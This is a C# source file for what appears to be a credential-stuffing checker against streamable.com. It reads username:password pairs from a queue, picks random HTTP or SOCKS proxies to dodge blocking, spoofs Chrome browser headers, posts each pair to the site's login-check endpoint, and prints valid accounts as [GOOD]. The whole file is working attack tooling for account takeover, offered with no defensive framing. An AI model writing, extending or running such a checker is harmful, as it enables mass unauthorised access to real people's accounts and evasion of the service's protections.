using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using CodeExam.Utils;
using Parsing;
using Request;

namespace CodeExam.Checker
{
    public class HttpRequest
    {
        public static List<string> list;
        public static ConcurrentQueue<string> coqueue;

        public static void Checker(ProxyType proxyType)
        {
            while (coqueue.Count > 0)
            {
                if (coqueue.Count == 0)
                {
                    Config.StopThreads(Program.threads);
                    Environment.Exit(0);
                }

                string text;
                coqueue.TryDequeue(out text);
                string[] array = text.Split(new char[]
                {
                ':'
                });

                

                Dictionary<string, string> headers = new Dictionary<string, string>()
                {
                { "Origin", "https://streamable.com" },
                { "Pragma", "no-cache" },
                { "Referer", "https://streamable.com/" },
                { "Sec-Ch-Ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"" },
                { "Sec-Ch-Ua-Mobile", "?0" },
                { "Sec-Ch-Ua-Platform", "\"Windows\"" },
                { "Sec-Fetch-Dest", "empty" },
                { "Sec-Fetch-Mode", "cors" },
                { "Sec-Fetch-Site", "same-site" },
                { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" }
                };

                string proxyData = string.Empty;

                if(proxyType == ProxyType.Http || proxyType == ProxyType.Socks4 || proxyType == ProxyType.Socks5)
                {
                    Random rn = new Random();
                    proxyData = list[rn.Next(list.Count)];
                }

                var Recived = Request.Request.SendRequest("https://ajax.streamable.com/check", "POST", "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}",
                "application/json", headers, array[0], array[1], proxyType, proxyData).Content;


                if (Recived.ToString().Contains("UserDoesNotExist") || Recived.ToString().Contains("Incorrect password, try again!"))
                {
                    string texts = Parse.JSON(Recived.ToString(), "message").FirstOrDefault<string>();

                    Console.WriteLine("[FAIL] " + array[0] + ":" + array[1] + " : " + texts);
                }
                else if (Recived.ToString().Contains("ad_tags"))
                {
                    Console.WriteLine("[GOOD] " + array[0] + ":" + array[1] + " : " + Recived.ToString());
                }
                else
                {
                    coqueue.Enqueue(array[0] + ":" + array[1]);
                }
            }
        }

    }
}
